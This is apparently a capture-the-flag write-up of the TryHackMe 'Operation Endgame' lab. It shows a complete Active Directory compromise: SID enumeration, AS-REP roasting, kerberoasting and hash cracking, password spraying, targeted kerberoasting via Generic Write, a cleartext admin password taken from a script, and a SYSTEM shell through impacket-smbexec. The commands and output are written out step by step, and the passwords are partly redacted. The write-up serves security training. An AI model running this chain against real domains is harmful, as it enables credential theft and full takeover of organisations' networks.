# **Operation Endgame - TryHackMe**

*Target Ip. Address: 10.48.190.241*

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.48.190.241
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-28 14:51 +0545
Nmap scan report for 10.48.190.241
Host is up (0.046s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
80/tcp   open  http              Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-02-28 09:06:20Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
443/tcp  open  ssl/https?
| ssl-cert: Subject: commonName=thm-LABYRINTH-CA
| Not valid before: 2023-05-12T07:26:00
|_Not valid after:  2028-05-12T07:35:59
|_ssl-date: 2026-02-28T09:07:47+00:00; +1s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?                                                                                       
3389/tcp open  ms-wbt-server     Microsoft Terminal Services                                                           
|_ssl-date: 2026-02-28T09:07:47+00:00; +1s from scanner time.                                                          
| ssl-cert: Subject: commonName=ad.thm.local                                                                           
| Not valid before: 2026-02-27T09:04:35                                                                                
|_Not valid after:  2026-08-29T09:04:35                                                                                
| rdp-ntlm-info:                                                                                                       
|   Target_Name: THM                                                                                                   
|   NetBIOS_Domain_Name: THM                                                                                           
|   NetBIOS_Computer_Name: AD                                                                                          
|   DNS_Domain_Name: thm.local                                                                                         
|   DNS_Computer_Name: ad.thm.local                                                                                    
|   Product_Version: 10.0.17763                                                                                        
|_  System_Time: 2026-02-28T09:06:40+00:00
Service Info: Host: AD; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-02-28T09:06:42
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.27 seconds
```

So, we have all the Active Directory services available. Let's add the findings in our hosts file.

```bash
kali@kali:cat /etc/hosts                                                                                                                                 
10.48.190.241   ad.thm.local thm.local thm-LABYRINTH-CA
 
127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

That been done. Let's start by checking if we have guest logon allowed.

```bash
kali@kali:smbclient -L //10.48.190.241                                                                                                                   
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.48.190.241 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

So, we have guest logon allowed, we can use this to get the usernames.

```bash
kali@kali:impacket-lookupsid guest@10.48.190.241 -no-pass                                                                                                
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.48.190.241
[*] StringBinding ncacn_np:10.48.190.241[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1966530601-3185510712-10604624
498: THM\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: THM\Administrator (SidTypeUser)
501: THM\Guest (SidTypeUser)
502: THM\krbtgt (SidTypeUser)
512: THM\Domain Admins (SidTypeGroup)
513: THM\Domain Users (SidTypeGroup)
514: THM\Domain Guests (SidTypeGroup)
515: THM\Domain Computers (SidTypeGroup)
516: THM\Domain Controllers (SidTypeGrou
.
.
.
```

That is a very long list, let's pipe thae usernames in wordlist.

```bash
kali@kali:impacket-lookupsid guest@10.48.190.241 -no-pass | grep "SidTypeUser" | awk -F'\\' '{print $2}' | awk '{print $1}' > users.txt                  

kali@kali:head users.txt
Administrator
Guest
krbtgt
AD$
SHANA_FITZGERALD
CAREY_FIELDS
DWAYNE_NGUYEN
BRANDON_PITTMAN
BRET_DONALDSON
VAUGHN_MARTIN
.
.
.
```

We have the usernames, let's see if any users are AS-REP Roastable.

```bash
kali@kali:impacket-GetNPUsers THM/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.48.190.241                                
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User AD$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SHANA_FITZGERALD doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User CAREY_FIELDS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DWAYNE_NGUYEN doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User BRANDON_PITTMAN doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User BRET_DONALDSON doesn't have UF_DONT_REQUIRE_PREAUTH set
.
.
.
```

We got 5 AS-REP hashes, let's crack them using John the ripper.

```bash
kali@kali:cat asrep_hashes.txt                                                                                                                           
$krb5asrep$23$SHELLEY_BEARD@THM:8c46.....9e78a9
$krb5asrep$23$ISIAH_WALKER@THM:df360.....d56f3
$krb5asrep$23$QUEEN_GARNER@THM:05b5c2.....a937
$krb5asrep$23$PHYLLIS_MCCOY@THM:65c22.....c95a284
$krb5asrep$23$MAXINE_FREEMAN@THM:15c3d.....ee75e5
```

```bash
john asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt                                                                              
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:02:19 DONE (2026-02-28 15:01) 0g/s 102594p/s 512973c/s 512973C/s  0841079575..*7¡Vamos!
Session completed.
```

Unfortunately, none of the AS-REP hashes were cracked, now let's try kerberoasting to see if any user id Kerberoastable.

```bash
kali@kali:impacket-GetUserSPNs thm.local/guest -dc-ip 10.48.190.241 -request -no-pass                                                                    
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name      MemberOf                                            PasswordLastSet             LastLogon                   Delegation 
----------------------  --------  --------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/server.secure.com  CODY_ROY  CN=Remote Desktop Users,CN=Builtin,DC=thm,DC=local  2024-05-10 19:51:07.611965  2024-04-24 21:26:18.970113             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*CODY_ROY$THM.LOCAL$thm.local/CODY_ROY*$6f0529713246a5275f87420a68f9596f$560d8cf32b9ae9.....c979f
```

We got a kerberos hash for user cody_roy, let's see if that is crackable.

```bash
kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
MK...o0         (?)     
1g 0:00:00:00 DONE (2026-02-28 15:45) 2.777g/s 1965Kp/s 1965Kc/s 1965KC/s MOSSIMO..LEANN1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Since, we have valid credentials, let's use bloodhound to map out the AD structure.

```bash
kali@kali:bloodhound-python -u 'cody_roy' -p 'MK...o0' -d 'thm.local' -ns 10.48.190.241 -c All -v
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
DEBUG: Authentication: username/password
DEBUG: Resolved collection methods: acl, rdp, dcom, psremote, trusts, session, group, objectprops, container, localadmin
DEBUG: Using DNS to retrieve domain information
DEBUG: Querying domain controller information from DNS
DEBUG: Using domain hint: thm.local
INFO: Found AD domain: thm.local
.
.
.
```

We see that our user can rdp into the machine. Let's login via rdp.

```bash
kali@kali:xfreerdp3 /u:cody_roy /p:'MK...o0' /v:10.48.190.241 /d:thm.local /dynamic-resolution /cert:ignore /drive:share,/home/kali/tools
[16:10:32:535] [25642:0000642a] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Using /p is insecure
[16:10:32:535] [25642:0000642a] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Passing credentials or secrets via command line might expose these in the process list
[16:10:32:535] [25642:0000642a] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Consider using one of the following (more secure) alternatives:
```

<img width="1020" height="796" alt="Screenshot 2026-03-03 094341" src="https://github.com/user-attachments/assets/340d7172-7acb-4aa9-9d19-0b53230e7a2a" />

What !!! We cannot open anything.

<img width="1028" height="802" alt="Screenshot 2026-03-03 094408" src="https://github.com/user-attachments/assets/04024468-f0b9-4e25-8b50-9dfc29b86b99" />

We can use Win+R, then type cmd to spawn a command prompt.

```bash
C:\>dir
Volume in drive C has no label.
Volume Serial Number is A8A4-C362
Directory of C:\
05/16/2023  11:00 AM    <DIR>          Data 
11/14/2018  06:56 AM    <DIR>          EFI                                                                             
05/12/2023  07:34 AM    <DIR>          inetpub                                                                         
05/13/2020  05:58 PM    <DIR>          PerfLogs                                                                        
07/05/2023  12:06 PM    <DIR>          Program Files                                                                   
03/11/2021  07:29 AM    <DIR>          Program Files (x86)                                                             
05/13/2024  07:23 PM    <DIR>          Scripts                                                                         
03/03/2026  03:56 AM    <DIR>          Users                                                                           
04/16/2024  09:56 PM    <DIR>          Windows                                                                                        
0 File(s)              0 bytes                                                                                          
9 Dir(s)  12,482,605,056 bytes free                                                                                                                                                                                             
C:\>cd Scripts                                                                                                         
Access is denied.
```

We find a scripts directory, but it is currently not accessible by cody_roy. 

Let's try a password spraying, hoping we can get some user with same password.

```bash
kali@kali:nxc smb ad.thm.local -u users.txt -p 'MK..o0' --continue-on-success                                                                             
SMB         10.48.190.241   445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                                          
SMB         10.48.190.241   445    AD               [-] thm.local\Administrator:MK..o0 STATUS_LOGON_FAILURE 
SMB         10.48.190.241   445    AD               [-] thm.local\Guest:MK..o0 STATUS_LOGON_FAILURE 
SMB         10.48.190.241   445    AD               [-] thm.local\krbtgt:MK..o0 STATUS_LOGON_FAILURE 
SMB         10.48.190.241   445    AD               [-] thm.local\AD$:MK..o0 STATUS_LOGON_FAILURE
.
.
.
.
SMB         10.48.190.241   445    AD               [+] thm.local\ZACHARY_HUNT:MK..o0 
SMB         10.48.190.241   445    AD               [-] thm.local\MERLIN_HARPER:MK..o0 STATUS_LOGON_FAILURE 
SMB         10.48.190.241   445    AD               [-] thm.local\SALVATORE_DODSON:MK..o0 STATUS_LOGON_FAILURE 
SMB         10.48.190.241   445    AD               [-] thm.local\KRISTINE_RIDDLE:MK..o0 STATUS_LOGON_FAILURE 
SMB         10.48.190.241   445    AD               [-] thm.local\BRAD_HOWE:MK..o0 STATUS_LOGON_FAILURE
```

That was a success, user ZACHARY_HUNT also has the same password.

```bash
kali@kali:nxc smb 10.48.190.241 -u ZACHARY_HUNT -p 'MK...o0'                                                                                                   
SMB         10.48.190.241   445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                                          
SMB         10.48.190.241   445    AD               [+] thm.local\ZACHARY_HUNT:MK...o0
```

<img width="1253" height="944" alt="Screenshot 2026-03-03 092538" src="https://github.com/user-attachments/assets/3fbd579b-4011-4999-9c5a-b405a871a3b1" />

We see this user has Generic Write over jerri_lancaster. Let's request the ticket for that user.

```bash
kali@kali:python3 targetedKerberoast.py -v -d 'thm.local' -u 'ZACHARY_HUNT' -p 'MK...o0' --dc-host ad.thm.local --request-user JERRI_LANCASTER
[*] Starting kerberoast attacks
[*] Attacking user (JERRI_LANCASTER)
[VERBOSE] SPN added successfully for (JERRI_LANCASTER)
[+] Printing hash for (JERRI_LANCASTER)
$krb5tgs$23$*JERRI_LANCASTER$THM.LOCAL$thm.local/JERRI_LANCASTER*$ce4d930b6e71d6b0dd866cf33fe50133$885db75bd.....c443dec41
[VERBOSE] SPN removed successfully for (JERRI_LANCASTER)
```

We got the kerberos hash, let's crack it.

```bash
kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads                                                                                                                                 
Press 'q' or Ctrl-C to abort, almost any other key for status                                                                                             
lo...fe!       (?)                                                                                                                                      
1g 0:00:00:00 DONE (2026-03-03 09:38) 2.777g/s 1737Kp/s 1737Kc/s 1737KC/s lrcjks..love2cook                                                               
Use the "--show" option to display all of the cracked passwords reliably                                                                                  
Session completed. 
```

That was successful. 

```bash
kali@kali:nxc rdp 10.48.190.241 -u JERRI_LANCASTER -p 'lo...fe!'                                                                                              
RDP         10.48.190.241   3389   AD               [*] Windows 10 or Windows Server 2016 Build 17763 (name:AD) (domain:thm.local) (nla:True)
RDP         10.48.190.241   3389   AD               [+] thm.local\JERRI_LANCASTER:lo...fe! (Pwn3d!)
```

Since, we have rdp login allowed, let's check if we can access that Script directory we saw earlier.

```bash
kali@kali:xfreerdp3 /u:JERRI_LANCASTER /p:'lo...fe!' /v:10.48.190.241 /d:thm.local /dynamic-resolution /cert:ignore                                           
[09:45:19:672] [14948:00003a64] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Using /p is insecure
[09:45:19:672] [14948:00003a64] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Passing credentials or secrets via command line might expose these in the process list
[09:45:19:672] [14948:00003a64] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Consider using one of the following (more secure) alternatives:
```
```bash
C:\Scripts>dir                                                                                                          
Volume in drive C has no label.                                                                                        
Volume Serial Number is A8A4-C362                                                                                                                                                                                                              
Directory of C:\Scripts                                                                                                                                                                                                                       
05/13/2024  07:23 PM    <DIR>          .                                                                               
05/13/2024  07:23 PM    <DIR>          ..                                                                              
05/13/2024  06:50 PM               426 syncer.ps1                                                                                     
1 File(s)            426 bytes                                                                                          2
Dir(s)  12,435,197,952 bytes free
```

We can access the directory and we have a powershell script here.

```bash
C:\Scripts>type syncer.ps1                                                                                             
#Import Active Directory module                                                                                     
Import-Module ActiveDirectory                                                                                                                                                                                                                  
# Define credentials                                                                                                   
$Username = "SANFORD_DAUGHERTY"                                                                                        
$Password = ConvertTo-SecureString "RE...23" -AsPlainText -Force                                                 
$Credential = New-Object System.Management.Automation.PSCredential($Username, $Password)                                                                                                                                                       
# Sync Active Directory                                                                                                
Sync-ADObject -Object "DC=thm,DC=local" -Source "ad.thm.local" -Destination "ad2.thm.local" -Credential $Credential
```

Yay !!! We have a cleartext credentials for user sanford_daugherty. 

```bash
kali@kali:nxc smb 10.48.190.241 -u SANFORD_DAUGHERTY -p 'RE...23'                             
SMB         10.48.190.241   445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                                          
SMB         10.48.190.241   445    AD               [+] thm.local\SANFORD_DAUGHERTY:RE...123 (Pwn3d!)
```

<img width="1251" height="942" alt="Screenshot 2026-03-03 094919" src="https://github.com/user-attachments/assets/cdee3c21-7679-433d-bdfe-6f83cc9055fa" />

We are in Domain Admin's group, let's use impacket-smbexec to login to machine.

```bash
kali@kali:impacket-smbexec 'THM.LOCAL/SANFORD_DAUGHERTY:RE...23@ad.thm.local'                                                                             
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

We are nt authority\system on the machine, let's search the flag.

```bash
C:\Windows\system32>dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

05/10/2024  02:46 PM    <DIR>          .
05/10/2024  02:46 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
05/10/2024  01:52 PM                59 flag.txt.txt
               3 File(s)          1,140 bytes
               2 Dir(s)  12,426,043,392 bytes free
```

We find our flag. Let's read that and end this challenge.

```bash
C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt.txt
THM{IN.....TS}
```
